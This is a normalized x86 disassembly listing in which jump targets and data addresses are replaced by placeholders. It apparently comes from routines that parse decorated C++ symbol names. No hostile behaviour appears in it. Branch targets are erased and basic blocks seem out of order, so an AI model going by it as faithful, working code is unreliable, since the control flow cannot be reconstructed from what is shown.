lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp [ eax + 0x2 ] 0x5a
jne r-xdata
add esp 0xc
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
jmp r-xdata
add eax 0x3
mov [ rw-data ] eax
sub_41480e
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push esi
push edi
mov al [ eax ]
test al al
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_4108ad
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_411021
mov edi [ ebp + 0xc ]
xor esi esi
cmp [ edi ] esi
je r-xdata
cmp al 0x36
jl r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
cmp [ ebx ] esi
je r-xdata
push edi
lea ecx [ ebp - 0x8 ]
call sub_410f29
cmp al 0x5f
jne r-xdata
cmp al 0x39
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop ebx
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
cmp [ edi ] esi
je r-xdata
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push 0x0
push [ ebp + 0xc ]
push esi
push [ ebp + 0x10 ]
push eax
call sub_4129a9
xor eax eax
cmp [ esi ] 0x2a
sete al
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_41470c
add esp 0x20
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_410873
mov eax [ ebp + 0xc ]
xor esi esi
mov edi [ ebp + 0x10 ]
cmp [ eax ] esi
je r-xdata
push ebx
lea ecx [ ebp - 0x8 ]
call sub_410f29
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f6c
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ edi ] esi
je r-xdata
cmp [ edi ] esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_413904
pop ecx
pop ecx
push edi
lea ecx [ ebp - 0x8 ]
call sub_410f29
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
test [ edi + 0x4 ] 0x100
jne r-xdata
sub_414926
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push esi
push edi
mov cl [ eax ]
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
cmp cl 0x5f
jne r-xdata
inc eax
mov [ rw-data ] eax
movsx edi [ eax ]
sub edi 0x41
inc eax
mov [ rw-data ] eax
cmp edi 0x3
ja r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov ecx [ ebp - 0x4 ]
shr eax 0x1
and ecx 0xffff0000
not eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
test al 0x1
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_411021
push 0xc
call sub_41117e
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_411021
test edi edi
je r-xdata
push 0x29
lea ecx [ ebp - 0x8 ]
call sub_410f6c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov esi edi
not esi
inc esi
and esi edi
mov eax esi
sub eax 0x1
je r-xdata
push r--data
sub eax 0x1
jne r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_411021
jmp r-xdata
push r--data
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_411021
not esi
and edi esi
je r-xdata
sub_414a18
push ebp
mov ebp esp
mov eax [ rw-data ]
push [ ebp + 0xc ]
cmp [ eax ] 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_413004
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
inc eax
mov [ rw-data ] eax
call sub_410826
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_414a47
push ebp
mov ebp esp
sub esp 0xf4
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x1 ] 0x0
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov eax [ esi + 0x4 ]
and eax 0xffff00ff
mov [ esi + 0x4 ] eax
test al al
jne r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp al 0x40
je r-xdata
cmp al 0x40
je r-xdata
push esi
lea eax [ ebp - 0x7c ]
push eax
push r--data
lea eax [ ebp - 0x74 ]
push eax
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_4108ad
mov ecx eax
call sub_410ee5
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_410c27
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
push esi
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x84 ]
call sub_410873
mov ecx eax
call sub_410e7f
cmp [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x74 ]
push esi
push eax
lea eax [ ebp - 0x7c ]
inc eax
mov [ rw-data ] eax
movsx eax [ eax ]
sub eax 0x24
je r-xdata
push esi
lea eax [ ebp - 0x44 ]
push eax
push 0x5b
lea ecx [ ebp - 0x8c ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x44 ]
mov [ esi ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
dec [ rw-data ]
lea eax [ ebp - 0xf4 ]
push esi
push eax
lea eax [ ebp - 0x6c ]
jmp r-xdata
sub eax 0x1
je r-xdata
push 0x0
push 0x1
push eax
call sub_4160f0
add esp 0xc
push 0x40
push rw-data
lea ecx [ ebp - 0x64 ]
call sub_41072b
push esi
lea eax [ ebp - 0x5c ]
push eax
push r--data
lea ecx [ ebp - 0xec ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x5c ]
mov [ esi ] eax
mov eax [ ebp - 0x58 ]
mov [ esi + 0x4 ] eax
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
sub eax 0x1a
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_4110c2
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0x5f
jne r-xdata
dec eax
sub eax 0x1
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
call sub_4130d6
pop ecx
push eax
lea eax [ ebp - 0x54 ]
push eax
push 0x60
lea ecx [ ebp - 0xdc ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
push 0x27
mov [ ebp - 0x30 ] eax
call sub_410f6c
push esi
lea eax [ ebp - 0xe4 ]
push eax
lea ecx [ ebp - 0x34 ]
jmp r-xdata
cmp [ eax + 0x2 ] 0x3f
jne r-xdata
sub eax 0x8
je r-xdata
call sub_410e7f
push esi
lea eax [ ebp - 0xc4 ]
mov [ rw-data ] ecx
push eax
push 0x0
lea eax [ ebp - 0xcc ]
push 0x0
push eax
call sub_413ecf
add esp 0xc
mov ecx eax
call sub_410e7f
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
inc [ rw-data ]
lea eax [ ebp - 0xac ]
push esi
push eax
push 0x5d
lea eax [ ebp - 0xb4 ]
push eax
push 0x0
lea eax [ ebp - 0xbc ]
push 0x1
push eax
call sub_4160f0
add esp 0xc
mov ecx eax
call sub_410ea1
mov ecx eax
call sub_410e7f
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub eax 0x8
je r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
xor edi edi
and ebx 0xffff0000
inc [ rw-data ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
push esi
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x9c ]
push eax
call sub_413da3
pop ecx
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
and ebx 0xffff0002
or ebx 0x2
xor edi edi
test edi edi
je r-xdata
mov ecx eax
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
mov edi [ ebp - 0x2c ]
mov ebx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x14 ]
push r--data
mov [ ebp - 0x14 ] eax
call sub_411021
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410f29
mov edi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4160f0
mov ecx [ ebp - 0x28 ]
add esp 0xc
test cl cl
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x5b
lea ecx [ ebp - 0xa4 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x48 ]
push 0x5d
mov [ ebp - 0x20 ] eax
call sub_410f6c
mov eax [ ebp - 0x24 ]
mov [ esi ] eax
mov eax [ ebp - 0x20 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] edi
test bl bl
jne r-xdata
sub_414e25
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi 0xfffffeff
push ebx
mov [ esi + 0x4 ] bl
mov eax [ esi + 0x4 ]
and eax edi
mov [ esi ] ebx
and eax 0xffff01ff
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_4160f0
mov ecx eax
add esp 0xc
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
test al al
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
jne r-xdata
mov cl [ eax ]
cmp cl 0x40
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
test cl cl
je r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
cmp cl 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
and eax edi
mov [ esi ] ebx
and eax 0xffff01ff
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] 0x2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_414a47
pop ecx
mov ecx eax
call sub_410ee5
mov ecx eax
call sub_410e7f
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
push esi
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_4108ad
mov ecx eax
call sub_410ee5
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov [ esi ] ecx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
push 0x1
mov ecx esi
call sub_410c27
jmp r-xdata
sub_414f20
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
jne r-xdata
push 0x0
cmp cl 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_4108ad
jmp r-xdata
push [ ebp + 0x8 ]
call sub_413322
pop ecx
pop ecx
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_413322
push eax
push 0x2d
push [ ebp + 0x8 ]
call sub_410e13
add esp 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_414f84
push ebp
mov ebp esp
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
push [ ebp + 0xc ]
mov esi [ eax + 0x8 ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_40d4a2
mov ecx edi
call esi
pop esi
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop ebp
retn 0x8
sub_414fb0
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebx ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov [ esi ] 0x0
mov edi [ ebp + 0xc ]
call sub_4163b4
push esi
mov ecx rw-data
lea edi [ eax + 0x1 ]
push edi
call sub_413de0
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
lea eax [ edi - 0x1 ]
mov ecx ebx
add eax esi
push eax
push esi
call sub_414f84
mov [ eax ] 0x0
jmp r-xdata
sub_415006
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x4
push r--data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41515b
add esp 0x10
jmp r-xdata
pop ebp
retn 0x8
sub_415059
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
push edi
push [ ebp + 0xc ]
mov edi [ ebx + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ edi ]
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
cmp eax [ ebp + 0xc ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ ebx + 0x8 ]
push [ ebp + 0xc ]
push eax
mov edx [ edi ]
mov esi [ edx + 0x8 ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
sub_4150b8
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_410873
mov ecx [ rw-data ]
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
jne r-xdata
push 0x2
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x5f
jne r-xdata
lea eax [ ebp - 0x10 ]
inc ecx
push 0x0
push eax
mov [ rw-data ] ecx
call sub_413322
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_413322
mov eax [ rw-data ]
add esp 0x10
mov cl [ eax ]
test cl cl
je r-xdata
dec eax
mov [ rw-data ] eax
push 0x1
jmp r-xdata
cmp cl 0x40
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
inc eax
mov [ rw-data ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41515b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
sub eax edx
mov ecx [ ebp + 0x14 ]
cmp ecx eax
jle r-xdata
test ecx ecx
je r-xdata
mov ecx eax
lea eax [ edx + ecx ]
pop ebp
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi edx
sub edi edx
mov ebx ecx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ebx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
sub_415192
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4160f0
inc eax
cmp [ eax ] 0x24
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_413ecf
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4157cb
pop ecx
pop ecx
jmp r-xdata
add esp 0xc
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4151da
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov [ ebp - 0x15 ] dl
and [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
and [ edi + 0x4 ] 0xffff00ff
mov [ rw-data ] dl
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
mov [ rw-data ] 0x0
pop edi
call sub_40c38e
mov esp ebp
pop ebp
retn
push esi
mov esi [ rw-data ]
push ebx
pop ebx
pop esi
cmp al 0x40
je r-xdata
xor bl bl
test dl dl
je r-xdata
mov bl 0x1
mov [ ebp - 0x15 ] bl
jmp r-xdata
mov [ ebp - 0x34 ] esi
cmp al 0x24
jne r-xdata
push ecx
mov ecx [ rw-data ]
lea eax [ ebp - 0x5c ]
inc esi
push eax
mov [ rw-data ] esi
call sub_410c5c
mov ecx eax
mov eax [ ecx ]
mov [ ebp - 0x20 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
and [ ebp - 0x20 ] 0x0
mov edx 0xffff0000
and [ ebp - 0x1c ] edx
xor bh bh
movsx ecx al
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
mov al [ esi ]
cmp al 0x58
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp al 0x24
jne r-xdata
inc esi
mov [ rw-data ] esi
push r--data
movsx eax [ esi + 0x2 ]
sub eax 0x24
je r-xdata
cmp [ edi + 0x4 ] 0x0
mov dl [ ebp - 0x15 ]
je r-xdata
test bl bl
je r-xdata
cmp al 0x3f
jne r-xdata
inc esi
cmp [ esi ] al
je r-xdata
mov esi [ rw-data ]
mov eax esi
sub eax [ ebp - 0x34 ]
cmp eax 0x1
jle r-xdata
cmp [ esi + 0x3 ] 0x56
jne r-xdata
sub eax 0x31
je r-xdata
mov al [ esi ]
test al al
je r-xdata
lea eax [ ebp - 0x20 ]
mov ecx edi
push eax
call sub_410f29
test bh bh
je r-xdata
push 0x2c
mov ecx edi
call sub_410f6c
and [ ebp - 0x44 ] 0x0
lea eax [ ebp - 0x44 ]
and [ ebp - 0x40 ] edx
push eax
lea eax [ ebp - 0x7c ]
push eax
call sub_414531
pop ecx
lea eax [ ebp - 0x3c ]
push eax
call sub_414f20
test [ rw-data ] 0x4000
pop ecx
je r-xdata
lea eax [ ebp - 0x64 ]
mov [ rw-data ] esi
push eax
call sub_415487
jmp r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
add esi 0x4
add esi 0x3
mov [ rw-data ] esi
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi [ rw-data ]
push r--data
mov ecx edi
call sub_411021
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x74 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x50 ]
push r--data
mov [ ebp - 0x2c ] eax
call sub_411021
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x2c ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop ecx
mov ecx eax
mov eax [ ecx ]
mov [ ebp - 0x20 ] eax
mov eax [ ecx + 0x4 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_4110c2
mov esi [ rw-data ]
add esi 0x3
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x1c ] eax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_414fb0
lea eax [ ebp - 0x14 ]
push eax
call sub_42efe6
mov esi [ rw-data ]
pop ecx
push eax
mov ecx esi
call j_sub_40d4a2
call esi
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov bh 0x1
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x6c ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x48 ]
push r--data
mov [ ebp - 0x24 ] eax
call sub_411021
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
jmp r-xdata
push eax
jmp r-xdata
lea ecx [ ebp - 0x20 ]
call sub_410bf5
jmp r-xdata
sub_415487
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov cl [ eax ]
inc eax
push edi
movsx edi cl
mov [ ebp - 0x81 ] cl
mov [ rw-data ] eax
cmp edi 0x4a
jg r-xdata
cmp edi 0x51
je r-xdata
cmp edi 0x46
jge r-xdata
push 0x2
cmp edi 0x52
je r-xdata
push 0x7b
lea ecx [ ebp - 0x80 ]
call sub_4107fa
mov al [ ebp - 0x81 ]
sub al 0x48
cmp al 0x2
ja r-xdata
sub edi 0x0
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_414f20
pop ecx
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x8c ]
call sub_414fb0
lea eax [ ebp - 0x14 ]
push eax
call sub_42efe6
test [ rw-data ] 0x4000
mov esi eax
pop ecx
je r-xdata
cmp edi 0x53
je r-xdata
sub edi 0x46
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_4130d6
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410f29
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f6c
dec eax
mov [ rw-data ] eax
sub edi 0x30
je r-xdata
and esi 0xfff
lea eax [ ebp - 0x14 ]
push esi
push r--data
push 0x10
push eax
call sub_401a50
add esp 0x10
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x80 ]
push eax
call sub_410873
sub edi 0x52
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x7c ] ecx
test ecx ecx
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
and [ ebx + 0x4 ] 0xffff00ff
jmp r-xdata
jle r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414f20
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410f29
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f6c
sub edi 0x1
je r-xdata
mov ecx ebx
call sub_4108ad
push ebx
call sub_414f20
jmp r-xdata
sub edi 0x1
je r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
jmp r-xdata
dec edi
sub edi 0x1
je r-xdata
and eax 0xfff
push eax
call j_sub_40d4a2
call [ ebp - 0x7c ]
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp edi 0x56
jle r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414f20
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410f29
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f6c
sub edi 0x1
je r-xdata
pop ecx
jmp r-xdata
cmp [ eax ] 0x40
jne r-xdata
sub edi 0x1
je r-xdata
lea ecx [ ebp - 0x94 ]
call sub_410873
mov ecx eax
call sub_410e7f
push r--data
push ebx
lea ecx [ ebp - 0x8c ]
call sub_410ee5
jmp r-xdata
sub edi 0x1
je r-xdata
push eax
jmp r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414f20
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410f29
sub edi 0x1
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_4130d6
pop ecx
push eax
push ebx
push r--data
lea ecx [ ebp - 0x8c ]
call sub_410873
jmp r-xdata
inc eax
mov [ rw-data ] eax
push r--data
lea eax [ ebp - 0x80 ]
push eax
call sub_414f20
lea eax [ ebp - 0x8c ]
push eax
call sub_414f20
cmp [ ebp - 0x7c ] 0x1
pop ecx
pop ecx
jg r-xdata
sub edi 0x13
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
jmp r-xdata
sub edi 0x1
jne r-xdata
mov ecx ebx
call sub_410873
jmp r-xdata
sub edi 0x1
jne r-xdata
mov ecx eax
call sub_410e7f
jmp r-xdata
push 0x1
jmp r-xdata
cmp [ ebp - 0x88 ] 0x1
jg r-xdata
push ebx
call sub_4130d6
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
push 0x7d
push ebx
lea ecx [ ebp - 0x80 ]
call sub_410ea1
jmp r-xdata
push 0x64
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_414fb0
test eax eax
je r-xdata
mov al [ ebp - 0x77 ]
mov [ ebp - 0x78 ] al
cmp al 0x2d
jne r-xdata
mov [ ebp - 0x77 ] 0x2e
mov al [ ebp - 0x76 ]
mov [ ebp - 0x77 ] al
mov [ ebp - 0x76 ] 0x2e
jmp r-xdata
lea eax [ ebp - 0x8c ]
push eax
push ebx
push 0x65
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x94 ]
call sub_410873
mov ecx eax
call sub_410ea1
sub_4157cb
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xac
cmp [ eax ] 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1 ] 0x24
jne r-xdata
mov ecx [ rw-data ]
add eax 0x2
or [ ebp - 0x54 ] 0xffffffff
or [ ebp - 0x80 ] 0xffffffff
or [ ebp - 0xac ] 0xffffffff
push ebx
mov [ ebp - 0x10 ] ecx
xor bl bl
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x54 ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0x80 ]
push edi
mov edi [ rw-data ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0xac ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
cmp [ eax ] 0x3f
mov [ ebp - 0x1 ] bl
jne r-xdata
push 0x1
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4160f0
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_413ecf
mov bl [ ebp - 0x1 ]
jmp r-xdata
test bl bl
jne r-xdata
mov [ rw-data ] 0x1
mov ecx [ eax ]
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] esi
pop edi
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_4151da
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x3c
lea ecx [ ebp - 0x28 ]
call sub_4107fa
